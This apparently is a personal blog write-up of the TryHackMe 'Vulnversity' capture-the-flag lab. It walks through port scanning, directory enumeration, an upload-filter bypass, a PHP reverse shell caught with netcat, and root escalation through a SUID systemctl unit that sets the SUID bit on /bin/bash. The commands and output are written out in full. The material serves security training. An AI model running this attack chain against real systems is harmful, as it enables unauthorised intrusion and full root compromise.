---
title: "Try Hach Me - Vulnversity"
date: 2022-05-08T17:50:58+05:30
description: "vulnversiy  was the first box towards offensive security path. we found web portal running on port 3333 using gobuster we found some  directory's,  which helps To upload our shell codes. with help of  securifera github page we can able to identify correct file  extension, gained user shell using php-reverse-shell and escalated privilege using SUID bit binary with help of Gtfobins."
draft: false
hideToc: false
tocPosition: outer
enableToc: true
enableTocContent: false
author: Atom
authorEmoji: ✍️
tags: 
- suid
- systemctl
series:
- Try Hack Me - Offensive Security
categories:
- tryhackme
image: /images/tryhackme/vulnversity/cover.webp
---
## Road Map
{{< img src="/images/tryhackme/vulnversity/roadmap.webp" alt="image alt" width="1000px" position="center" >}}
## Kill Chain Summary
Vulnversiy  is the first box towards offensive security path. we found web portal running on port 3333 using gobuster we found some  directory's,  which helps To upload our shell codes. with help of securifera github page we can able to identify correct file  extension, gained user shell using weevely and escalated privilege using SUID bit binary with help of Gtfobins.
## Info Table
<table style="width:70%">
 <thead>
  <tr>
    <th>Title</th>
    <th>Vulnversity</th>
  </tr>
</thead>
  <tr>
    <td>Description</td>
    <td>Learn about active recon, web app attacks and privilege escalation.</td>
    </tr>
  </tr>
   <tr>
    <td>Difficulty</td>
    <td>Easy</td>
    </tr>
    <tr>
    <td>Maker</td>
    <td>Try Hack Me </td>
    </tr>
</table>

## Reconnaissance
``` bash
$ nmap -sV 10.10.8.53
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-28 15:35 IST
Nmap scan report for 10.10.8.53
Host is up (0.30s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.94 seconds

```
The result of nmap scan makes port 3333 interest because.  service HTTP belongs to port 80. lets dig port 3333

{{< img src="/images/tryhackme/vulnversity/1.png" alt="image alt" width="1000px" position="center" >}}

## directory search

lets do directory search and identify if any sensitive directory  are exposed 

``` bash {hl_lines=[23]}
$gobuster dir -u http://10.10.1.215:3333 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.1.215:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/28 23:29:54 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/css                  (Status: 301) [Size: 315] [--> http://10.10.1.215:3333/css/]
/fonts                (Status: 301) [Size: 317] [--> http://10.10.1.215:3333/fonts/]
/images               (Status: 301) [Size: 318] [--> http://10.10.1.215:3333/images/]
/index.html           (Status: 200) [Size: 33014]                                    
/internal             (Status: 301) [Size: 320] [--> http://10.10.1.215:3333/internal/]
/js                   (Status: 301) [Size: 314] [--> http://10.10.1.215:3333/js/]      
/server-status        (Status: 403) [Size: 301]                                        
                                                                                       
===============================================================
2022/04/28 23:31:55 Finished
===============================================================
```
{{< img src="/images/tryhackme/vulnversity/2.png" alt="image alt" width="1000px" position="center" >}}

here there is a place to upload file, lets try to upload reverse shell file, in kali  /usr/share/webshells/php/ directory we have set of php shell payloads. just modify attacker ip and port and upload

but why php shell ?  PHP is one of the widely used languages for web development (more than 60%) which makes it one of the most targeted ones

## Reverse shell
``` bash
$vim /usr/share/webshells/php/php-reverse-shell.php
```
{{< img src="/images/tryhackme/vulnversity/3.png" alt="image alt" width="800px" position="center" >}}

upload the php reverse shell 

{{< img src="/images/tryhackme/vulnversity/4.png" alt="image alt" width="1000px" position="center" >}}

we notice that .php extension is not allowed to upload, lets try to bypass or find right extension to upload 

{{< img src="/images/tryhackme/vulnversity/5.png" alt="image alt" width="1000px" position="center" >}}

we need list of extension file we will use   <a href="https://gist.github.com/securifera/e7eed730cbe1ce43d0c29d7cd2d582f4">securifera</a> filename extension file which is available on his github page 

{{< img src="/images/tryhackme/vulnversity/6.png" alt=" image alt" width="1000px" position="center">}}

make sure that you need to untuck url encoding which is available under Payload Encoding 

{{< img src="/images/tryhackme/vulnversity/7.png" alt=" image alt" width="1000px" position="center">}}

after our payload has been uploaded, we need to find right directory ware our payload has been uploaded, again we will use directory search each suspicious directory 

{{< img src="/images/tryhackme/vulnversity/8.png" alt=" image alt" width="800px" position="center">}}

we finded uploads directory and it holds our payload, before accessing payload file, make sure netcat listen on port which has configured on payload 

## Initial FootHold
``` bash
┌─[atomloop@atomloop-virtualbox]─[~]
└──_ $sudo nc -lvnp 8181
[sudo] password for atomloop: 
listening on [any] 8181 ...
connect to [10.18.105.26] from (UNKNOWN) [10.10.25.213] 37564
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 05:48:30 up  1:40,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```
yes, we got our initial foot hold, lets try to esculate privilege, lets list any SUID files 

## SUID files 

``` bash  {hl_lines=[26]}
$ sudo -l
sudo: no tty present and no askpass program specified
$ find / -perm -u=s 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

<a href="https://gtfobins.github.io/">GTFOBins</a> is a collection of Unix binaries that can be used to bypass local security restrictions in misconfigured systems

``` Bash
TempFile=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TempFile
/bin/systemctl link $TempFile
/bin/systemctl enable --now $TempFile
/bin/bash -p
```
we have given suid permission to /bin/bash which can allow us to run bash as root.

Systemctl is the tool used to control the systemd init service. systemd is a Linux initialization system and service manager that includes features like on-demand starting of daemons, mount and automount point maintenance, snapshot support, and processes tracking using Linux control groups. systemd provides a logging daemon and other tools and utilities to help with common system administration tasks.

TempFile=$(mktemp).service - we are creating an environment variable called “TempFile” (you can call it whatever you want). Within that variable we are calling the mktemp command to create a temporary file as a systemd service unit file (the “.service” part at the end)

```
TempFile=$(mktemp).service
```

the config we need our unit file to execute.

```
[Service]
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TempFile
```

 The problem is that our current logged-in user does not have permission to write to /etc/systemd/system where this would normally go. We get around that by echoing our unit file one line at a time into the env variable we just created.

echo ‘[Service] - calls the echo command to start echoing the input (notice the single quote? By not including the second single quote to close the line we are able to enter multiple single line inputs and complete our systemd unit file)

[Service] - the first part of our unit file

```ExecStart=/bin/sh -c “chmod +s /bin/bash”``` - when the service starts call the default system shell (the -c tells the shell to execute everything inside the quotes),
we have given suid permission to /bin/bash which can allow us to run bash as root. 

[Install] - the second part of our unit file

```WantedBy=multi-user.target’ > $TempFile```- sets the state (or run level) at which this service will run (notice the closing single quote?), the > directs all our inputs to the TempFile env variable

```/bin/systemctl link $TempFile``` - per the systemctl man page, this makes our unit file available for systemctl commands even though it is outside of the standard search paths

```/bin/systemctl enable —now $TempFile``` - “…Enable one or more units or unit instances. This will create a set of symlinks, as encoded in the ```"[Install]"``` sections of the indicated unit files. After the symlinks have been created, the system manager configuration is reloaded (in a way equivalent to daemon-reload), in order to ensure the changes are taken into account immediately. Note that this does not have the effect of also starting any of the units being enabled. If this is desired, combine this command with the ```--now``` switch…”

## Root shell
```
└──_ #nc -lvnp 8181                                                                                                                                                                           
listening on [any] 8181 ...                                                                                                                                                                   
connect to [10.18.105.26] from (UNKNOWN) [10.10.240.190] 60678                                                                                                                                
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux                                                                            
 21:38:51 up 26 min,  0 users,  load average: 0.00, 0.00, 0.02                                                                                                                                
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                                                                                           
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                                         
/bin/sh: 0: can't access tty; job control turned off                                                                                                                                          
$ id                                                                                                                                                                                          
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
$ TempFile=$(mktemp).service                                                                                                                                                                  
echo '[Service]                                                                                                                                                                               
Type=oneshot                                                                                                                                                                                  
ExecStart=/bin/sh -c "chmod +s /bin/bash"                                                                                                                                                     
[Install]                                                                                                                                                                                     
WantedBy=multi-user.target' > $TempFile                                                                                                                                                       
/bin/systemctl link $TempFile                                                                                                                                                                 
/bin/systemctl enable --now $TempFile                                                                                                                                                         
/bin/bash -p$ > > > > $ Created symlink from /etc/systemd/system/tmp.xB76fAiWD8.service to /tmp/tmp.xB76fAiWD8.service.                                                                       
$ Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.xB76fAiWD8.service to /tmp/tmp.xB76fAiWD8.service.
                                                                                                                              
$ /bin/bash -p
whoami
root
```   

See You on the next Blog, Happy Hacking